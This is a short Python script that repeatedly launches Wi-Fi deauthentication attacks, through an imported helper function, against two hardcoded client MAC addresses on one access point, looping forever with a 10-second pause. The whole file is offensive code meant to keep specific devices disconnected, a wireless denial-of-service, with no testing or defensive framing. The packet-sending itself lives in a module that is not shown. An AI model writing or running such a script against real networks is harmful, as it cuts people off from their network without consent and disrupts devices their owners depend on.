import time
from utils import deau_attack

BSSID = "D8:6C:E9:A1:DA:E0"
tab_client = []
client1 = "84:38:38:A1:D3:51"
client2 = "74:2F:68:7F:6A:D3"
tab_client.append(client1)
tab_client.append(client2)

while True:
	for c in tab_client:
		deau_attack(BSSID, c)
		time.sleep(10)
